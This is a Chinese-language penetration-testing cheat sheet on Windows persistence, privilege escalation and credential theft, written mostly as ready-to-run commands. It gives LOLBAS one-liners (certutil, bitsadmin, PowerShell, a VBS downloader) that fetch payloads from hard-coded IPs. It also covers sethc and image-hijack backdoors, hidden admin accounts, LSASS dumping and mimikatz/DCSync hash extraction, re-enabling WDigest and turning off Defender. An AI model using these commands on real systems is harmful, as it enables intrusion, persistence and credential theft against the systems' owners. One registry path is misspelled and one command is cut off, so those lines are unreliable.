持久化 - Windows
========================================

开启远程登录
----------------------------------------
- 前提：执行系统命令。
- 添加用户
	+ net user命令
	+ 其它
		- 当主机含有杀毒软件时，则常规命令会被拦截，可将以下程序上传到目标机器，然后执行
		- ``https://github.com/RuanLang0777/CreateUser``
- 查看RDP端口
	+ ``REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber``
- 命令行开启
	+ windows server 2003
		::
		
			开启1：
			REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
			关闭：
			REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
			开启2：
			wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
			REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
			REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
	+ windows server 2008
		::
		
			REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
	+ 注：0x00000d3d即3389。

隐藏文件
----------------------------------------
- 创建系统隐藏文件
    - ``attrib +s +a +r +h filename`` / ``attrib +s +h filename``
- 利用NTFS ADS (Alternate　Data　Streams) 创建隐藏文件
- 利用Windows保留字
    - ``aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9``

LOLBAS
----------------------------------------

定义
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念。

这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。

常见程序
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- bitsadmin.exe
	+ 下载文件:``bitsadmin /transfer myDownLoadJob /download /priority normal "http://192.168.203.140/b.ps1" "E:\\phpstudy_pro\\WWW\\b.ps1"``
- cdb.exe
- certutil.exe
    + 下载文件:``certutil -urlcache -split -f http://192.168.203.140/b.exe``
- cmd.exe
- cmstp.exe
- csc.exe
- cscript.exe
	+ 第一种
	
	::
	
		echo Set Post = CreateObject("Msxml2.XMLHTTP") >>download.vbs
		echo Set Shell = CreateObject("Wscript.Shell") >>download.vbs
		echo Post.Open "GET","http://192.168.203.140/a.ps1",0 >>download.vbs
		echo Post.Send() >>download.vbs
		echo Set aGet = CreateObject("ADODB.Stream") >>download.vbs
		echo aGet.Mode = 3 >>download.vbs
		echo aGet.Type = 1 >>download.vbs
		echo aGet.Open() >>download.vbs
		echo aGet.Write(Post.responseBody) >>download.vbs
		echo aGet.SaveToFile "D:/a.ps1",2 >>download.vbs
	
	+ 第二种：``echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  >> downfile.vbs``
	+ 下载文件：``cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1``
	
- expand.exe
    + 展开一个或多个压缩文件
- mofcomp.exe
- msbuild.exe
    + 构建应用程序
- mshta.exe
- netsh.exe
- installutil.exe
    + 安装/卸载程序组件
- powershell.exe
	+ 下载文件:``powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://45.32.1.7:80/download/file.exe','d:\yayou\Web\RYFront\system.exe')``
	+ 下载文件:``powershell (new-object Net.WebClient).DownloadFile('http://192.168.203.140/a.ps1','E:\phpstudy_pro\WWW\a.ps1')``
	+ 执行程序:``powershell Start-Process d:\yayou\Web\RYFront\system.exe``
- psexec.exe
- reg.exe
- regedit.exe
- regsvr32.exe
- rundll32.exe
- sc.exe
- schtasks.exe
- wmic.exe
- windbg.exe
- wscript.exe

后门
----------------------------------------

sethc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``sethc.exe`` 是 Windows系统在用户按下五次shift后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 ``sethc.exe`` 的方式留下后门，在密码输入页面输入五次shift即可获得权限。

映像劫持
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在高版本的Windows中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。

具体操作为在注册表的 ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option`` 下添加项 ``sethc.exe`` ，然后在 ``sethc.exe`` 这个项中添加 ``debugger`` 键，键值为恶意程序的路径。

定时任务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows下有 ``schtasks`` 和 ``at`` 两种计划任务机制。 其中 ``at`` 在较高版本的Windows中已经弃用。

::

    win7及以下版本系统：at命令默认以system权限运行，使用at命令以交互方式运行cmd.exe
    at 14:27 /interactive cmd.exe
    
    win7及以上版本系统：使用创建名称为restart的计划任务，命令行运行notepad.exe
    SCHTASKS /Create /SC once /TN restart /TR "notepad.exe" /ST 14:27 /RL HIGHEST
    注：提示未正确加载资源的话，使用chcp 437 命令切换到英文环境即可。
        /create 指的是创建计划任务
        /s 指定远程计算机
        /tn 指定计划任务的名称
        /ru　指定运行该批处理的账号，如果去掉该参数则默认为当前账户运行，会提示输入密码。(一个计划任务所用的账号如果密码变动后该批处理就不再会运行成功)
        /rp 指定账号的密码
        /tr 指定程序所在路径，这里为指定要执行的批处理存放路径。
        /sc 为指定运行的周期
        /d 为日期，一周中的一天或多天 (请使用以下缩写形式：Mon、Tue、Wed、Thu、Fri、Sat、Sun) 或 (月中的一天或多天使用数字 1 到 31)
        /st 为运行时间
    注：经过测试，即便使用/RL HIGHEST参数，也无法使notepad.exe以system权限运行。

登录脚本
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows可以在用户登录前执行脚本，使用 ``HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`` 设置。

屏幕保护程序
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows可以自定义屏幕保护程序，使用 ``HKEY_CURRENT_USER\Control Panel\Desktop`` 设置。

隐藏用户
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows可以使用在用户名后加入 ``$`` 来创建匿名用户，这种方式创建的用户只能通过注册表查看。
::
	
	添加用户：
	net user admin123 123456 /add
	加入管理员组：
	net localgroup administrators admin123 /add
	加入远程登录组：
	net localgroup "Remote Desktop Users" admin123 /add

CLR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET产品构建的运行环境，可以粗略地理解为.NET虚拟机。

.NET程序的运行离不开CLR，因此可以通过劫持CLR的方式实现后门。

UAC
----------------------------------------

简介
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
UAC (User Account Control) 是Windows的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。

当用户登陆Windows时，每个用户都会被授予一个access token，这个token中有security identifier (SID) 的信息，决定了用户的权限。

会触发UAC的操作
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 以管理员权限启动应用
- 修改系统、UAC设置
- 修改没有权限的文件或者目录（ %SystemRoot% / %ProgramFiles% 等 ） 
- 修改ACL (access control list)
- 安装驱动
- 增删账户，修改账户类型，激活来宾账户

自启动
----------------------------------------
通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 ``Run`` 和 ``RunOnce`` ，其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。

权限提升
----------------------------------------
权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或者其他类似的漏洞，以获得较高的权限。

逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。

提权辅助工具
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://i.hacking8.com/tiquan/

利用计划任务升级system
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ schtasks方式
+ at方式
+ 交互式服务
    ::
    
        适用环境：win7，xp
        以管理员权限运行cmd，输入并运行 “sc Create SuperCMD binPath= "cmd /K start" type= own type= interact” 安装名为SuperCMD的交互式服务。
        cmd运行“net start SuperCMD”命令，启动服务。
        弹出“交互式服务检测”对话框，点击查看消息，进入的cmd窗口就是system权限了。
        关闭和卸载：
        net stop SuperCMD
        sc delete SuperCMD

任意写文件利用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在Windows中用户可以写的敏感位置主要有以下这些

+ 用户自身的文件和目录，包括 ``AppData`` ``Temp``
+ ``C:\`` ，默认情况下用户可以写入
+ ``C:\ProgramData`` 的子目录，默认情况下用户可以创建文件夹、写入文件
+ ``C:\Windows\Temp`` 的子目录，默认情况下用户可以创建文件夹、写入文件

具体的ACL信息可用AccessChk, 或者PowerShell的 ``Get-Acl`` 命令查看。

可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限。

MOF
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
MOF是Windows系统的一个文件（ ``c:/windows/system32/wbem/mof/nullevt.mof`` ）叫做"托管对象格式"，其作用是每隔五秒就会去监控进程创建和死亡。

当拥有文件上传的权限但是没有Shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。

一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户。

凭证窃取
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 综合工具
	+ LaZagne
		- 一键抓取目标机器上存储的所有明文密码。
		- 项目地址：``https://github.com/AlessandroZ/LaZagne``
- 浏览器
	+ HackBrowserData
		- 一款可全平台运行的浏览器数据导出解密工具。
		- 项目地址：``https://github.com/moonD4rk/HackBrowserData``
- 向日葵
	+ Sunflower_get_Password
		- 一款针对向日葵的识别码和验证码提取工具
		- 项目地址：``https://github.com/wafinfo/Sunflower_get_Password``
- Windows本地密码散列导出工具
    + mimikatz
        - https://github.com/gentilkiwi/mimikatz/
        - 输出日志： ``log``
        - 权限提升： ``privilege::debug``
        - sekurlsa模块
            ::
            
                
                抓取明文密码： sekurlsa::logonpasswords
                sekurlsa::logonpasswords

                抓取用户NTLM哈希
                sekurlsa::msv

                加载dmp文件，并导出其中的明文密码
                sekurlsa::minidump lsass.dmp
                sekurlsa::logonpasswords full

                导出lsass.exe进程中所有的票据
                sekurlsa::tickets /export
        - kerberos模块
            ::
            
                列出系统中的票据
                kerberos::list
                kerberos::tgt

                清除系统中的票据
                kerberos::purge

                导入票据到系统中
                kerberos::ptc 票据路径
        - lsadump模块
            ::
            
                在域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等
                lsadump::dcsync /domain:kevin.com /user:root

                (在域控上执行)读取所有域用户的哈希
                lsadump::lsa /patch

                从sam.hive和system.hive文件中获得NTLM Hash
                lsadump::sam /sam:sam.hive /system:system.hive

                从本地SAM文件中读取密码哈希
                token::elevate
                lsadump::sam
        - wdigest
            ::
            
                WDigest协议是在WindowsXP中被引入的,旨在与HTTP协议一起用于身份认证。
                默认情况下,Microsoft在多个版本的Windows(Windows XP-Windows 8.0和Windows Server 2003-Windows Server 2012)中启用了此协议,
                这意味着纯文本密码存储在LSASS(本地安全授权子系统服务)进程中。 Mimikatz可以与LSASS交互,允许攻击者通过以下命令检索这些凭据。
                mimikatz #privilege::debug
                mimikatz #sekurlsa::wdigest
                在windows2012系统以及以上的系统之后这个默认是关闭的如果在 win2008 之前的系统上打了 KB2871997 补丁，那么就可以去启用或者禁用 
                WDigest。Windows Server2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server2012以下版本，如果安装
                了KB2871997补丁，攻击者同样无法获取明文密码。配置如下键值：
                HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
                UseLogonCredential 值设置为 0, WDigest 不把凭证缓存在内存；UseLogonCredential 值设置为 1, WDigest 就把凭证缓存在内存。
                使用powershell进行更改
                开启Wdigest Auth
                Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
                关闭Wdigest Auth
                Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProvid
        - LSA保护
            ::
            
                如何防止mimikatz获取一些加密的密文进行PTH攻击呢！其实微软推出的补丁KB2871997是专门针对PTH攻击的补丁，但是如果PID为500的话，
                还是可以进行PTH攻击的！本地安全权限服务(LSASS)验证用户是否进行本地和远程登录,并实施本地安全策略。 Windows 8.1及更高版本的
                系统中,Microsoft为LSA提供了额外的保护,以防止不受信任的进程读取内存或代码注入。Windows 8.1之前的系统,攻击者可以执行Mimikatz
                命令来与LSA交互并检索存储在LSA内存中的明文密码。

                这条命令修改键的值为1，即使获取了debug权限吗，也不能直接获取明文密码和hash
                reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f


    + lsass
    + wce
    + gsecdump
    + copypwd
    + Pwdump
    + ProcDump
        - https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
        - 管理员权限dump LSASS进程： ``procdump.exe -accepteula -ma lsass.exe 1.dmp``
        - mimikatz读取密码： ``mimikatz.exe "log" "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit``
    + msf中kiwi模块
        - 加载： ``load kiwi``
        - 帮助： ``help kiwi``
        - 主要命令
            ::
            
                creds_all：列举所有凭据
                creds_kerberos：列举所有kerberos凭据
                creds_msv：列举所有msv凭据
                creds_ssp：列举所有ssp凭据
                creds_tspkg：列举所有tspkg凭据
                creds_wdigest：列举所有wdigest凭据
                dcsync：通过DCSync检索用户帐户信息
                dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
                golden_ticket_create：创建黄金票据
                kerberos_ticket_list：列举kerberos票据
                kerberos_ticket_purge：清除kerberos票据
                kerberos_ticket_use：使用kerberos票据
                kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
                lsa_dump_sam：dump出lsa的SAM
                lsa_dump_secrets：dump出lsa的密文
                password_change：修改密码
                wifi_list：列出当前用户的wifi配置文件
                wifi_list_shared：列出共享wifi配置文件/编码
        - kiwi_cmd
            ::
            
                kiwi_cmd可以使用mimikatz中的所有功能，命令需要接上mimikatz的命令
                kikiwi_cmd sekurlsa::logonpasswords
- Windows本地密码破解工具
    - L0phtCrack
    - SAMInside
    - Ophcrack
- ntds.dit的导出+QuarkPwDump读取分析
- vssown.vbs + libesedb + NtdsXtract
- ntdsdump
- 利用powershell(DSInternals)分析hash
- 使用 ``net use \\%computername% /u:%username%`` 重置密码尝试次数
- 限制读取时，可crash操作系统后，在蓝屏的dump文件中读取

其他
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 组策略首选项漏洞
- DLL劫持
- 替换系统工具，实现后门
- 关闭defender
    - ``Set-MpPreference -disablerealtimeMonitoring $true``
